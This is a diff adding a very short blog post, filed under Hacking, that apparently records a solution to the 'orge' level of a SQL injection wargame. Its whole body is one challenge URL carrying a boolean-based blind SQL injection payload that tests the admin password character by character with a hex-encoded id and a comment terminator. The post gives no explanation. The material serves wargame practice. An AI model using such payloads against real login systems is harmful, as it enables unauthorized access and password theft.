@@ -1,0 +1,14 @@
+---
+layout: post
+title: LOS ORGE 
+date: 2015-09-14 15:59:00 +0900
+category: Hacking
+---
+```
+
+http://los.sandbox.cash/chall/orge_724bc99aec5d0ec3664912dfacdca45a.php?pw=1%27||id=0x61646d696e%26%26ascii(substr(pw,8,1))%3C=100%23
+
+
+```
+
+
